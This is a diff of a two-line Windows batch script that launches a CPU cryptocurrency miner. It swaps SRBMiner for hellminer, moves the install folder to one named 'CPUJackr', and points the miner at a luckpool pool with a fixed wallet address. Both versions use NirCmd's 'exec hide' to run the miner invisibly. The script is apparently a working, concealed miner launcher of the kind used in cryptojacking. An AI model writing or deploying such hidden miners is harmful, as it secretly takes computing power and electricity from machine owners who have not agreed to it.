@@ -1,2 +1,2 @@
 @echo off
-start "" /min "C:\ChainMiner\NirCmd\nircmd.exe" exec hide "C:\ChainMiner\SRBMiner-MULTI.exe" --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RMovVQiRqawd8KThXQtKQhgESBPGzrSnXX
+start "" /min "C:\CPUJackr\NirCmd\nircmd.exe" exec hide "C:\CPUJackr\hellminer.exe" -c stratum+tcp://na.luckpool.net:3960 -u RMovVQiRqawd8KThXQtKQhgESBPGzrSnXX -p x --cpu 4 RMovVQiRqawd8KThXQtKQhgESBPGzrSnXX
